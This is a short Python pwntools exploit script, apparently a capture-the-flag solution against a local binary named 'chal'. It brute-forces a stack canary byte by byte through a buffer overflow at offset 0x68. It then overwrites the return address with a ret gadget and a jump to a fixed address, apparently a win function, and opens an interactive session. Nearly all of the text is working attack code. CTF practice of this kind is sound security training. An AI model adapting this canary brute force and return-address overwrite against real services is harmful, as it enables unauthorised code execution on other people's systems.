from pwn import *
context.log_level ='debug'
context.arch = 'amd64'
p = process("./chal")
#gdb.attach(p)
canary = b"\x00"
for x in range(7):
    tmp = 0 
    for y in range(0x100):
        p.send(b"A"*0x68+canary+y.to_bytes(1,'little'))
        try:
            data = p.readline()
            if(b"detected" not in data):
                canary+=y.to_bytes(1,'little')
                tmp = 1
                break
        except:
            print(data)
    if not tmp:
        exit(1)
    
log.warning(hex(u64(canary)))
p.send(b"A"*0x68+canary+p64(0x40101a)*2+p64(0x4011f6))
p.interactive()